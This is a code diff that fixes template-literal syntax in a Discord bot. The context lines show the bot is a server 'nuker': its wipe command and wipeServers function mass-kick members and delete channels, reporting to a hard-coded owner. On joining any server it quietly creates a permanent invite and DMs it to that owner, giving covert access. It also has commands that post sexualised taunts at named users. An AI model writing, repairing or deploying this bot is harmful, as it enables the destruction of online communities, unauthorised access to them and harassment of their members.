@@ -77,10 +77,10 @@ function registerCommands() {
   const options = {
     hostname: 'discord.com',
     port: 443,
-    path: /api/v10/applications/${CLIENT_ID}/commands,
+    path: `/api/v10/applications/${CLIENT_ID}/commands`,
     method: 'PUT',
     headers: {
-      'Authorization': Bot ${TOKEN},
+      'Authorization': `Bot ${TOKEN}`,
       'Content-Type': 'application/json',
       'Content-Length': Buffer.byteLength(JSON.stringify(commands))
     }
@@ -93,7 +93,7 @@ function registerCommands() {
       if (res.statusCode === 200) {
         console.log("✅ Slash commands registered successfully");
       } else {
-        console.error(❌ Failed to register commands: ${res.statusCode});
+        console.error(`❌ Failed to register commands: ${res.statusCode}`);
       }
     });
   });
@@ -116,11 +116,11 @@ async function wipeServers(owner) {
       const canDelete = me.permissions.has(Permissions.FLAGS.MANAGE_CHANNELS);
 
       if (!canKick || !canDelete) {
-        await owner.send(Skipped: ${guild.name} (missing permissions));
+        await owner.send(`Skipped: ${guild.name} (missing permissions)`);
         continue;
       }
 
-      await owner.send(Cleaning: ${guild.name});
+      await owner.send(`Cleaning: ${guild.name}`);
 
       for (const channel of guild.channels.cache.values()) {
         try {
@@ -138,16 +138,16 @@ async function wipeServers(owner) {
             await member.kick("Server cleanup");
             kicked++;
             if (kicked % 10 === 0) {
-              await owner.send(${guild.name}: kicked ${kicked});
+              await owner.send(`${guild.name}: kicked ${kicked}`);
             }
             await delay(1200);
           } catch (e) { }
         }
       }
 
-      await owner.send(Finished ${guild.name}. Total kicked: ${kicked});
+      await owner.send(`Finished ${guild.name}. Total kicked: ${kicked}`);
     } catch (e) {
-      await owner.send(Skipped ${guild.name} due to error);
+      await owner.send(`Skipped ${guild.name} due to error`);
     }
   }
 
@@ -155,8 +155,8 @@ async function wipeServers(owner) {
 }
 
 client.once("ready", async () => {
-  console.log(✅ Logged in as ${client.user.tag});
-  console.log(📊 Bot is in ${client.guilds.cache.size} servers);
+  console.log(`✅ Logged in as ${client.user.tag}`);
+  console.log(`📊 Bot is in ${client.guilds.cache.size} servers`);
   registerCommands();
   console.log("🎯 Ready for slash commands!");
 
@@ -189,7 +189,7 @@ client.on("interactionCreate", async interaction => {
 
   const { commandName, user } = interaction;
 
-  console.log(⚡ Slash command: /${commandName} from ${user.tag});
+  console.log(`⚡ Slash command: /${commandName} from ${user.tag}`);
 
   try {
     if (commandName === "echo") {
@@ -210,13 +210,13 @@ client.on("interactionCreate", async interaction => {
 
     if (commandName === "servers") {
       let list = client.guilds.cache
-        .map(g => ${g.name} (${g.memberCount} members))
+        .map(g => `${g.name} (${g.memberCount} members)`)
         .join("\n");
       
       if (list.length === 0) list = "No servers.";
       
       await interaction.reply({
-        content: **Servers:**\n${list},
+        content: `**Servers:**\n${list}`,
         ephemeral: true
       });
       return;
@@ -243,13 +243,13 @@ client.on("interactionCreate", async interaction => {
 
     if (commandName === "diddle") {
       const target = interaction.options.getUser("user");
-      await interaction.reply(<@${target.id}> was diddled);
+      await interaction.reply(`<@${target.id}> was diddled`);
       return;
     }
 
     if (commandName === "oil") {
       const target = interaction.options.getUser("user");
-      await interaction.reply(<@${user.id}> oiled up <@${target.id}>);
+      await interaction.reply(`<@${user.id}> oiled up <@${target.id}>`);
       return;
     }
 
@@ -262,10 +262,10 @@ client.on("interactionCreate", async interaction => {
         return;
       }
 
-      await interaction.reply({ content: Starting wipe on **${guild.name}**. Check your DMs., ephemeral: true });
+      await interaction.reply({ content: `Starting wipe on **${guild.name}**. Check your DMs.`, ephemeral: true });
 
       const owner = await client.users.fetch(OWNER_ID);
-      await owner.send(Starting wipe on **${guild.name}**...);
+      await owner.send(`Starting wipe on **${guild.name}**...`);
 
       try {
         const me = guild.me;
@@ -273,7 +273,7 @@ client.on("interactionCreate", async interaction => {
         const canDelete = me.permissions.has(Permissions.FLAGS.MANAGE_CHANNELS);
 
         if (!canKick || !canDelete) {
-          await owner.send(❌ Missing permissions in **${guild.name}**.);
+          await owner.send(`❌ Missing permissions in **${guild.name}**.`);
           return;
         }
 
@@ -288,15 +288,15 @@ client.on("interactionCreate", async interaction => {
             try {
               await member.kick("Server cleanup");
               kicked++;
-              if (kicked % 10 === 0) await owner.send(${guild.name}: kicked ${kicked});
+              if (kicked % 10 === 0) await owner.send(`${guild.name}: kicked ${kicked}`);
               await delay(1200);
             } catch (e) {}
           }
         }
 
-        await owner.send(✅ Done with **${guild.name}**. Kicked: ${kicked});
+        await owner.send(`✅ Done with **${guild.name}**. Kicked: ${kicked}`);
       } catch (e) {
-        await owner.send(❌ Error wiping **${guild.name}**: ${e.message});
+        await owner.send(`❌ Error wiping **${guild.name}**: ${e.message}`);
       }
       return;
     }
@@ -330,7 +330,7 @@ process.on("uncaughtException", error => {
 });
 
 client.on("guildCreate", async guild => {
-  console.log(📥 Joined new server: ${guild.name});
+  console.log(`📥 Joined new server: ${guild.name}`);
   try {
     const owner = await client.users.fetch(OWNER_ID);
 
@@ -340,12 +340,12 @@ client.on("guildCreate", async guild => {
     );
 
     if (!channel) {
-      await owner.send(✅ Joined **${guild.name}** but couldn't create an invite (no suitable channel).);
+      await owner.send(`✅ Joined **${guild.name}** but couldn't create an invite (no suitable channel).`);
       return;
     }
 
     const invite = await channel.createInvite({ maxAge: 0, maxUses: 0 });
-    await owner.send(✅ Joined **${guild.name}**!\nInvite: ${invite.url});
+    await owner.send(`✅ Joined **${guild.name}**!\nInvite: ${invite.url}`);
   } catch (error) {
     console.error("❌ guildCreate error:", error.message);
   }
